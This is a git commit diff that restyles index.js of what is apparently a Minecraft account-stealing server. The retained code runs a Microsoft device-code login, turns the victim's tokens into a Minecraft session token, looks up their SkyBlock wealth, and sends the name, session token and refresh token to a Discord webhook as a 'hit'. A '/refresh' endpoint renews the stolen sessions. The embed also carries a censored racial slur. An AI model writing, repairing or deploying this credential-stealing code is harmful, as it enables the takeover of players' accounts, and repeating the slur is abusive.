51760ec259e02598c1ea7b7b02134543ee46693c
MultiDevCore <167513228+MultiDevCore@users.noreply.github.com>
2024-07-05 18:52:00 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
-const Authflow = require('./src/MicrosoftAuthFlow')
-const axios = require('axios')
+const Authflow = require('./src/MicrosoftAuthFlow');
+const axios = require('axios');
 const express = require('express');
-const cache = require('./src/common/cache/FileCache')
+const cache = require('./src/common/cache/FileCache');
 const { EmbedBuilder, WebhookClient } = require('discord.js');
 const app = express();
 const fs = require('fs');
@@ -18,56 +18,52 @@ function makeid(length) {
   return result;
 }
 
-async function GetPlayer(BearerToken) {
-  const url = 'https://api.minecraftservices.com/minecraft/profile'
+async function getPlayer(bearerToken) {
+  const url = 'https://api.minecraftservices.com/minecraft/profile';
   const config = {
       headers: {
-          'Authorization': 'Bearer ' + BearerToken,
+          'Authorization': 'Bearer ' + bearerToken,
       }
-  }
-  let response = await axios.get(url, config)
-  return [response.data['id'], response.data['name']]
+  };
+  const response = await axios.get(url, config);
+  return [response.data.id, response.data.name];
 }
 
 const testAuth = async (res) => {
-  const flow = new Authflow(makeid(7), './', { authTitle: '00000000402b5328', deviceType: 'Win32', flow: 'sisu' })
+  const flow = new Authflow(makeid(7), './', { authTitle: '00000000402b5328', deviceType: 'Win32', flow: 'sisu' });
 
   const ret = await flow.msa.authDeviceCode((response) => {
-    if (flow.codeCallback) return flow.codeCallback(response)
-  }, res)
+    if (flow.codeCallback) return flow.codeCallback(response);
+  }, res);
 
-  const dt = await flow.xbl.getDeviceToken()
-  const sisu = await flow.xbl.doSisuAuth(ret.accessToken, dt)
+  const dt = await flow.xbl.getDeviceToken();
+  const sisu = await flow.xbl.doSisuAuth(ret.accessToken, dt);
 
   const xboxLogin = await getXboxLogin(sisu);
- 
-  const [id, name] = await GetPlayer(xboxLogin)
+  const [id, name] = await getPlayer(xboxLogin);
 
-  SSIDCode = '```' + xboxLogin + '```'
-
+  const SSIDCode = '```' + xboxLogin + '```';
   const skycryptInfo = await getInfo(name);
 
   sendHit(name, id, skycryptInfo, ret.refreshToken, SSIDCode);
-}
-
-const getXboxLogin = async (res) => {
-  let DataBearerToken = {
-    identityToken: `XBL3.0 x=${res.userHash};${res.XSTSToken}`,
-    ensureLegacyEnabled: true
-  }
-
-  ResponseBearerToken = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', DataBearerToken, { headers: { 'Content-Type': 'application/json' } })
-
-  console.log(ResponseBearerToken.data.access_token)
-
-  return ResponseBearerToken.data.access_token;
 };
 
-const getInfo = async (res) => {
-  SkyCryptProfile = await axios.get('https://sky.shiiyu.moe/api/v2/profile/' + res, { headers: { 'Content-Type': 'application/json' } })
+const getXboxLogin = async (sisu) => {
+  const dataBearerToken = {
+    identityToken: `XBL3.0 x=${sisu.userHash};${sisu.XSTSToken}`,
+    ensureLegacyEnabled: true
+  };
 
-  const firstProfileKey = Object.keys(SkyCryptProfile.data.profiles)[0];
-  const firstProfileData = SkyCryptProfile.data.profiles[firstProfileKey];
+  const responseBearerToken = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', dataBearerToken, { headers: { 'Content-Type': 'application/json' } });
+
+  console.log(responseBearerToken.data.access_token);
+  return responseBearerToken.data.access_token;
+};
+
+const getInfo = async (name) => {
+  const skyCryptProfile = await axios.get(`https://sky.shiiyu.moe/api/v2/profile/${name}`, { headers: { 'Content-Type': 'application/json' } });
+  const firstProfileKey = Object.keys(skyCryptProfile.data.profiles)[0];
+  const firstProfileData = skyCryptProfile.data.profiles[firstProfileKey];
 
   return firstProfileData;
 };
@@ -84,9 +80,9 @@ const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
   const embed = new EmbedBuilder()
     .setColor(0x5D3FD3)
     .setTitle(name)
-    .setURL('https://sky.shiiyu.moe/stats/' + name)
-    .setThumbnail('https://crafatar.com/avatars/' + id)
-    .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://oauth2-0-4sq6.onrender.com/refresh?refreshToken=' + refresh })
+    .setURL(`https://sky.shiiyu.moe/stats/${name}`)
+    .setThumbnail(`https://crafatar.com/avatars/${id}`)
+    .setAuthor({ name: 'Hit Some Ni**a Hard', url: `https://oauth2-0-4sq6.onrender.com/refresh?refreshToken=${refresh}` })
     .addFields(
       { name: 'Network', value: '```' + networth + '```' },
       { name: 'Unsoulbound', value: '```' + uNetworth + '```' },
@@ -105,7 +101,8 @@ const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
 
 app.get('/verify', async (req, res) => {
   try {
-    testAuth(res); 
+    await testAuth(res); 
+    res.status(200).send('Verification successful.');
   } catch (err) {
     console.error('Authentication error:', err);
     res.status(500).send('Authentication failed.'); 
@@ -114,30 +111,27 @@ app.get('/verify', async (req, res) => {
 
 app.get('/refresh', async (req, res) => {
   try {
-    const flow = new Authflow(makeid(7), './', { authTitle: '00000000402b5328', deviceType: 'Win32', flow: 'sisu' })
+    const flow = new Authflow(makeid(7), './', { authTitle: '00000000402b5328', deviceType: 'Win32', flow: 'sisu' });
 
     const ret = await flow.msa.refreshTokens(req.query.refreshToken);
+    const dt = await flow.xbl.getDeviceToken();
+    const sisu = await flow.xbl.doSisuAuth(ret.accessToken, dt);
 
-    const dt = await flow.xbl.getDeviceToken()
-
-    const sisu = await flow.xbl.doSisuAuth(ret.accessToken, dt)
-  
     const xboxLogin = await getXboxLogin(sisu);
-   
-    const [id, name] = await GetPlayer(xboxLogin)
-  
-    SSIDCode = '```' + xboxLogin + '```'
-  
+    const [id, name] = await getPlayer(xboxLogin);
+
+    const SSIDCode = '```' + xboxLogin + '```';
     const skycryptInfo = await getInfo(name);
-  
+
     sendHit(name, id, skycryptInfo, ret.refreshToken, SSIDCode);
+    res.status(200).send('Refresh successful.');
   } catch (err) {
     console.error('Refresh error:', err);
     res.status(500).send('Refresh failed.');
   } 
 });
 
-const startApp = async () => {
+const startApp = () => {
   try {
     app.listen(process.env.PORT || 27017, () => {
         console.log(`Server started on port 27017`);
@@ -146,6 +140,6 @@ const startApp = async () => {
     console.error(`Error starting the application: ${err.message}`);
     process.exit(1);
   }
-}
+};
 
 startApp();
